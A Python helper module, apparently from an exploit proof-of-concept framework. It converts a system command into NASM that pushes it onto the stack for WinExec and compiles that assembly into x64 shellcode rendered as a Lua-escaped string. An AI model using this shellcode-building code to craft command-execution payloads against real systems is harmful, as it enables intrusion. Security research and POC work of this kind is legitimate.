import logging
import subprocess
import time
from pathlib import Path

from .download import download_w64devkit
from .environment import Config


def w64devkit_call(exe_name: str, *args: str | Path, **kwargs: str | Path) -> int:
    '''
    Call a program from within the `tools/w64devkit` folder with the provided arguments.

    Arguments:
        exe_name: A name of the program in the `tools/w64devkit/bin` folder to run.
        args: A list of arguments that will be forwared to the program.
        kwargs: Used to pass the working directory in the `cwd` key.

    Returns:
        The return code of the corresponding program.
    '''
    w64devkit_dir = Config.TOOLS_DIR / 'w64devkit' / 'bin'
    if not w64devkit_dir.exists():
        logging.debug('w64devkit not found! Downloading.')
        download_w64devkit()
        if not w64devkit_dir.exists():
            raise RuntimeError('w64devkit not found and download failed. You can download it manually '
                               f'and copy it over to \'{Config.TOOLS_DIR}\'.')
    retcode = subprocess.call([w64devkit_dir / exe_name, *args], cwd=kwargs.get('cwd'),
                              env=Config.ENV, stdout=Config.STDOUT, stderr=Config.STDERR)
    if retcode != 0:
        raise RuntimeError(f'\'{exe_name}\' failed with non-return code {retcode}!')


def command_to_nasm(command: str) -> str:
    '''
    Converts a system command to the corresponding NASM code that pushes
    the command to the stack, with proper alignment. Used for crafting
    arguments to WinExec for some exploits.

    Arguments:
        command: The command that will be run

    Returns:
        A string that represents a snippet of assembly which pushes the
        command to the stack.
    '''
    if len(command) > 248:  # implemented this function only for shorter payloads, is enough for the POCs
        raise RuntimeError('Maximum length of command exceeded!')

    # change the input to have length 248, 256 with the null bytes
    # that way the shellcode is run successfully
    command += ' ' * (248 - len(command))
    command_bytes = bytearray(command.encode())
    padding = -len(command_bytes) % 8
    command_bytes.extend([0] * padding)
    command_bytes = bytes(reversed(command_bytes))
    result = ''
    for i in range(0, len(command_bytes), 8):
        word = command_bytes[i:i + 8]
        result += f'mov rax, 0x{word.hex()}\n'
        result += 'push rax\n'
    return result


def nasm_to_lua_shellcode(input_file: Path):
    '''
    Compile a '.nasm' file to its corresponding byte representation
    as a Lua string and return it.

    Arguments:
        input_file: The input '.nasm' file.

    Returns:
        A string that contains the Lua-escaped byte values of the compiled
        assembly.
    '''
    logging.debug('Compiling asm...')
    shellcode_o = Config.TEMP_DIR / 'shellcode.o'
    w64devkit_call('nasm.exe', '-f', 'win64', str(input_file.resolve()), '-o', str(shellcode_o.resolve()))

    logging.debug('Dumping shellcode bytes...')
    shellcode_file = Config.TEMP_DIR / 'shellcode.raw'
    w64devkit_call('objcopy.exe', '-O', 'binary', '-j', '.text', shellcode_o, shellcode_file)

    # hack, but is simple and works
    time.sleep(1.0)
    if not shellcode_file.exists():
        raise RuntimeError('Shellcode file was not created.')

    logging.debug('Converting shellcode to Lua string...')
    shellcode_lua = ''
    with open(shellcode_file, 'rb') as f:
        data = f.read()
        for byte in data:
            shellcode_lua += f'\\{byte:03}'

    shellcode_o.unlink()
    shellcode_file.unlink()

    return shellcode_lua
